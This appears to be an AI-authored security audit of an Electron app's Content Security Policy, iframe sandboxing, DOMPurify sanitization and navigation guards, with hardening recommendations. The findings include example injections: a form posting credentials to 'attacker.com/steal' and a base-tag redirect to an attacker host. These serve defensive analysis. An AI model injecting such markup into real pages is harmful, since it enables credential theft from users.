# Sandbox & CSP Audit — BDE Electron App
**Audit Date:** 2026-04-13  
**Auditor:** Security Review Agent  
**Status:** Complete

---

## F-t2-csp-sandbox-1: CSP `unsafe-eval` Enabled in Dev Mode
**Severity:** High  
**Category:** Sandbox & CSP  
**Location:** `src/main/bootstrap.ts:198`  
**Evidence:**
```typescript
const csp = is.dev
  ? "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:*; " +
    // ...
```

The development CSP explicitly allows both `'unsafe-inline'` and `'unsafe-eval'` in the `script-src` directive. While necessary for HMR (hot module reload), this creates a significant attack surface if a development build is accidentally shipped to users or if an attacker compromises the dev server.

**Impact:**  
- An attacker with network access to `http://localhost:*` (same machine attack) can inject arbitrary JavaScript and have it execute without restriction
- Any XSS vulnerability in dev mode is fully exploitable (no CSP mitigation at all)
- Developers testing untrusted code locally have no sandbox protection
- If dev build artifacts leak to production, the entire CSP evaporates

**Recommendation:**  
1. Document clearly in README that dev builds must never reach end users
2. Implement a build-time check that fails the release build if `is.dev` code reaches production
3. Consider splitting dev CSP into a separate dev-only configuration
4. For local testing of untrusted HTML, isolate to the Playground iframe (which is already sandboxed with `sandbox="allow-scripts"`)

**Effort:** M  
**Confidence:** High

---

## F-t2-csp-sandbox-2: Missing CSP Frame Ancestors Directive (Clickjacking Risk)
**Severity:** Medium  
**Category:** Sandbox & CSP  
**Location:** `src/main/bootstrap.ts:196-210`  
**Evidence:**
```typescript
const csp = is.dev
  ? "default-src 'self'; " +
    // ... no frame-ancestors directive
  : "default-src 'self'; " +
    // ... no frame-ancestors directive
```

The CSP policy does not include a `frame-ancestors` directive, leaving the Electron renderer vulnerable to clickjacking attacks if embedded in a hostile frame (though Electron windows are generally isolated from web pages).

**Impact:**  
- Technically low-risk in Electron (windows are not embeddable in web contexts), but represents incomplete CSP coverage
- Best-practice CSP should always include `frame-ancestors 'none'` (for non-frameable resources)
- Omission makes it easier to introduce XSS or UI redressing in future
- No explicit clickjacking protection statement

**Recommendation:**  
Add `frame-ancestors 'none'` to production CSP:
```typescript
: "default-src 'self'; " +
  "script-src 'self'; " +
  "frame-ancestors 'none'; " +  // ← Add this
  "worker-src 'self' blob:; " +
  // ...
```

**Effort:** S  
**Confidence:** High

---

## F-t2-csp-sandbox-3: Missing CSP `form-action` Directive (Form Injection Risk)
**Severity:** Medium  
**Category:** Sandbox & CSP  
**Location:** `src/main/bootstrap.ts:196-210`  
**Evidence:**
CSP policy lacks `form-action` directive, leaving forms vulnerable to being submitted to arbitrary hosts if an attacker injects malicious `<form>` elements or modifies form targets.

**Impact:**  
- Attacker can inject `<form action="http://attacker.com/steal">` and have credentials submitted elsewhere
- Combined with DOM-based XSS, form-action omission means no mitigation for credential exfiltration
- `form-action 'self'` is a common hardening that's missing here
- Not critical if DOMPurify is applied consistently (which it mostly is), but provides defense-in-depth

**Recommendation:**  
Add `form-action 'self'` to both dev and production CSP:
```typescript
const csp = is.dev
  ? "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:*; " +
    "form-action 'self'; " +  // ← Add this
    "worker-src 'self' blob:; " +
    // ...
```

**Effort:** S  
**Confidence:** High

---

## F-t2-csp-sandbox-4: Missing CSP `base-uri` Directive (Relative URL Risk)
**Severity:** Low  
**Category:** Sandbox & CSP  
**Location:** `src/main/bootstrap.ts:196-210`  
**Evidence:**
CSP lacks `base-uri` directive, which controls where `<base>` tags can point. An attacker could inject `<base href="http://attacker.com/">` to redirect all relative URLs.

**Impact:**  
- Low in practice (Electron app doesn't use relative URLs heavily), but represents incomplete CSP
- Could theoretically affect modules loaded via relative imports if `<base>` is injected
- Best practice CSP includes `base-uri 'self'`

**Recommendation:**  
Add `base-uri 'self'` to the CSP policy.

**Effort:** S  
**Confidence:** Medium

---

## F-t2-csp-sandbox-5: Playground Iframe Sandbox Attribute Sufficient but Not Reinforced
**Severity:** Low  
**Category:** Sandbox & CSP  
**Location:** `src/renderer/src/components/agents/PlaygroundModal.tsx:252`  
**Evidence:**
```typescript
<iframe
  title={`Preview of ${filename}`}
  sandbox="allow-scripts"
  srcDoc={html}
  className="playground-modal__iframe"
/>
```

The Playground iframe uses `sandbox="allow-scripts"` only. While this is intentional and documented, it:
- Allows script execution (accepted risk for agent-generated HTML)
- Blocks: same-origin access, popups, form submission, top-level navigation, downloads, pointer lock

**Impact:**  
- This is an **ACCEPTED RISK** per the code comment — agents are trusted and must run JavaScript for interactive playgrounds
- However, the restrictive sandbox is good defense-in-depth against agent output containing malicious code
- The "Scripts enabled" warning in the UI properly flags this to users

**Recommendation:**  
Configuration is correct as-is. However, consider:
1. Reinforce that agents should never write code that exfiltrates data (trust assumption already documented)
2. If future Playground variants need to display untrusted HTML, use stricter sandbox (no `allow-scripts`)
3. Monitor iframe-to-parent communication if postMessage is ever added

**Effort:** N/A  
**Confidence:** High

---

## F-t2-csp-sandbox-6: HTML Sanitization via DOMPurify Properly Applied for Agent Output
**Severity:** N/A (Strength)  
**Category:** Sandbox & CSP  
**Location:** `src/main/playground-sanitize.ts`, `src/main/agent-manager/playground-handler.ts:67`  
**Evidence:**
```typescript
// src/main/playground-sanitize.ts
export function sanitizePlaygroundHtml(rawHtml: string): string {
  return purify.sanitize(rawHtml)
}

// src/main/agent-manager/playground-handler.ts:67
const sanitizedHtml = sanitizePlaygroundHtml(rawHtml)
```

DOMPurify is correctly:
1. Initialized on main process (JSDOM-backed), not renderer
2. Called immediately after agent writes HTML file
3. Applied before broadcasting to renderer
4. Strips script tags, event handlers, and `javascript:` URLs

Tests in `src/main/__tests__/playground-sanitize.test.ts` verify:
- Script tags are stripped
- Event handlers are removed
- `javascript:` URLs are removed
- Safe HTML (links, images, divs) is preserved

**Impact:**  
✓ **Proper defense-in-depth:** Even if sandbox is bypassed, DOMPurify prevents script execution  
✓ **Main-process sanitization:** Prevents XSS from renderer context  
✓ **Comprehensive test coverage:** 8 test cases cover common vectors

**Recommendation:**  
No changes needed. This is a security strength. Maintain test coverage as features evolve.

**Effort:** N/A  
**Confidence:** High

---

## F-t2-csp-sandbox-7: Diff Comment Markdown Sanitization via DOMPurify
**Severity:** N/A (Strength)  
**Category:** Sandbox & CSP  
**Location:** `src/renderer/src/components/diff/DiffCommentWidget.tsx:41`, `src/renderer/src/lib/render-markdown.ts:20`  
**Evidence:**
```typescript
// render-markdown.ts
function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'h1', 'h2', 'h3', 'strong', 'em', 'code', 'pre',
      'ul', 'ol', 'li', 'a', 'br', 'blockquote'
    ],
    ALLOWED_ATTR: ['href', 'title', 'class'],
    ALLOW_DATA_ATTR: false
  })
}

// DiffCommentWidget.tsx:41
<div
  className="diff-comment-widget__body"
  dangerouslySetInnerHTML={{ __html: renderMarkdown(c.body) }}
/>
```

Markdown comments are sanitized with a whitelist of safe tags before being injected via `dangerouslySetInnerHTML`. The allowlist is conservative: no event handlers, no `data-*` attributes, only URL-safe link attributes.

**Impact:**  
✓ **Only one use of `dangerouslySetInnerHTML` in entire renderer codebase**  
✓ **Whitelist is restrictive** (no style, script, form, input tags)  
✓ **Renderer-side sanitization** provides additional defense-in-depth  
✓ **GitHub PR comment content is trusted source** (comes from GitHub API, not user input)

**Recommendation:**  
No changes needed. This is correct and defensive. If PR comment data origin changes (e.g., user-generated), review the allowed-tags list.

**Effort:** N/A  
**Confidence:** High

---

## F-t2-csp-sandbox-8: External Link Handler Properly Validates URL Schemes
**Severity:** N/A (Strength)  
**Category:** Sandbox & CSP  
**Location:** `src/main/handlers/window-handlers.ts:7-16`  
**Evidence:**
```typescript
const ALLOWED_URL_SCHEMES = new Set(['https:', 'http:', 'mailto:'])

export function registerWindowHandlers(): void {
  safeHandle('window:openExternal', (_e, url) => {
    const parsed = new URL(url)
    if (!ALLOWED_URL_SCHEMES.has(parsed.protocol)) {
      throw new Error(`Blocked URL scheme: "${parsed.protocol}"`)
    }
    return shell.openExternal(url)
  })
}
```

Tests verify:
- `file://` URLs are blocked (prevents local file access)
- `javascript:` URLs are blocked (prevents code execution)
- `https://`, `http://`, `mailto:` are allowed
- Invalid URLs throw

**Impact:**  
✓ **Prevents file:// disclosure** — users cannot click links that read local files  
✓ **Prevents javascript: injection** — no code execution via URLs  
✓ **Whitelist approach** — only known-safe schemes allowed  
✓ **Tested thoroughly** — test cases cover both blocked and allowed schemes

**Recommendation:**  
No changes needed. This is a security strength. Pattern is correct.

**Effort:** N/A  
**Confidence:** High

---

## F-t2-csp-sandbox-9: Navigation Guard (`will-navigate`) Restrictive but Incomplete
**Severity:** Medium  
**Category:** Sandbox & CSP  
**Location:** `src/main/index.ts:74-78`  
**Evidence:**
```typescript
const appUrl =
  is.dev && process.env['ELECTRON_RENDERER_URL']
    ? process.env['ELECTRON_RENDERER_URL']
    : `file://${join(__dirname, '../renderer/index.html')}`

mainWindow.webContents.on('will-navigate', (event, url) => {
  if (!url.startsWith(appUrl)) {
    event.preventDefault()
  }
})
```

The `will-navigate` guard blocks top-level navigation to any URL that doesn't start with the app's initial URL. This prevents:
- Navigating to `http://attacker.com` in the main window
- BUT it only blocks **top-level navigation** (user clicks a link)

It does NOT prevent:
- Iframe navigation within the main window (separate guard needed)
- XmlHttpRequest / fetch to arbitrary domains (CSP `connect-src` handles this)
- Service worker registration to arbitrary origins

The Playground iframe (`sandbox="allow-scripts"`) is isolated and this check doesn't apply to it.

**Impact:**  
- Good defense against top-level XSS navigation attacks
- Does not cover all navigation vectors (iframes can still navigate independently)
- In practice, low risk because CSP restricts `connect-src` and only the Playground iframe allows scripts
- BUT: if a future feature embeds untrusted content in an iframe without sandbox, this guard alone is insufficient

**Recommendation:**  
1. Add a comment explaining the guard's scope: "Prevents top-level navigation; iframe navigation is controlled separately via sandbox attributes"
2. If iframe support expands, consider a more comprehensive navigation policy
3. Current setup is acceptable because:
   - Main window only loads app HTML (not user content)
   - Playgrounds are in sandboxed iframes
   - CSP further restricts `connect-src` to safe domains

**Effort:** S (documentation only)  
**Confidence:** High

---

## F-t2-csp-sandbox-10: Production CSP Overly Restrictive on `unsafe-inline` for Styles
**Severity:** Low  
**Category:** Sandbox & CSP  
**Location:** `src/main/bootstrap.ts:207`  
**Evidence:**
```typescript
: "default-src 'self'; " +
  "script-src 'self'; " +
  "worker-src 'self' blob:; " +
  "style-src 'self' 'unsafe-inline'; " +  // ← Allows inline styles
  "img-src 'self' data:; " +
  "font-src 'self' data:; " +
  `connect-src 'self' ${connectSrc} https://api.github.com`
```

The production CSP allows `'unsafe-inline'` for styles. While less dangerous than JavaScript inline (can't execute code), it still allows:
- CSS-based content exfiltration (attribute selectors, keyframe animations)
- UI redressing attacks (hiding/overlaying elements)

**Impact:**  
- Low risk in isolated Electron context (no external observers)
- BUT: if inline styles are not actually needed, should be removed
- Modern React/CSS-in-JS often generates external stylesheets, making inline unnecessary
- Best practice is to avoid `'unsafe-inline'` for any CSP directive

**Recommendation:**  
1. Audit whether `'unsafe-inline'` for styles is necessary:
   - Check if all styles are in external `src/renderer/src/assets/*.css` files
   - Verify no style tags are dynamically generated
   - If only external stylesheets used, remove `'unsafe-inline'` from `style-src`

2. If inline styles are truly necessary, scope them:
   - Use CSS custom properties (CSS variables) instead of inline styles
   - Move all dynamic styling to external stylesheets loaded via link tags

3. Target: `style-src 'self';` (without `'unsafe-inline'`)

**Effort:** M  
**Confidence:** Medium

---

## Summary

### Critical/High Findings
1. **CSP `unsafe-eval` in dev** (High) — Accepted for HMR, but needs guardrails against shipping dev builds
2. **Missing `frame-ancestors`** (Medium) — Add for completeness
3. **Missing `form-action`** (Medium) — Add for defense-in-depth

### Medium/Low Findings
4. **Missing `base-uri`** (Low) — Best-practice completeness
5. **Navigation guard incomplete** (Medium) — Document scope, currently acceptable
6. **Overly permissive `style-src`** (Low) — Audit and remove if possible

### Strengths (No Action Needed)
- ✓ DOMPurify properly applied to all HTML output (main-process sanitization)
- ✓ Single `dangerouslySetInnerHTML` use with strict whitelist
- ✓ External link handler properly validates URL schemes
- ✓ Playground iframe sandbox is correct and well-tested
- ✓ `contextIsolation: true` in webPreferences (renderer process isolated)
- ✓ No `nodeIntegration` enabled (defaults to false, good)
- ✓ No remote module usage
- ✓ No custom protocol handlers exposing `file://`

### Recommended Action Plan
**Priority 1 (Ship this release):**
- Document that dev builds must never reach users (update README)
- Add `frame-ancestors 'none'` and `form-action 'self'` to both dev and prod CSP

**Priority 2 (Next sprint):**
- Audit stylesheet handling — remove `'unsafe-inline'` from `style-src` if possible
- Add `base-uri 'self'` for completeness
- Document navigation guard scope in code comment

**Priority 3 (Ongoing):**
- Maintain DOMPurify tests as features evolve
- Monitor for new iframe usage and ensure sandbox attributes are present
- Periodically audit Zustand store state for any dynamic HTML generation

---

## Audit Checklist

- [x] Electron `webPreferences` reviewed (contextIsolation, nodeIntegration, webSecurity)
- [x] CSP headers checked (dev vs. prod, directives, permissiveness)
- [x] Dev Playground iframe sandbox verified
- [x] DOMPurify coverage confirmed (all HTML injection points)
- [x] `webContents` navigation handlers reviewed
- [x] External link handling (URL scheme validation)
- [x] Remote module usage verified (none found)
- [x] `nativeWindowOpen` and popup handlers reviewed
- [x] Protocol handlers scanned for `file://` exposure
- [x] `dangerouslySetInnerHTML` uses limited and sanitized
- [x] No eval/Function/dynamic code execution found

---

**Audit completed:** 2026-04-13  
**Report confidence:** High  
**Ready for review:** Yes
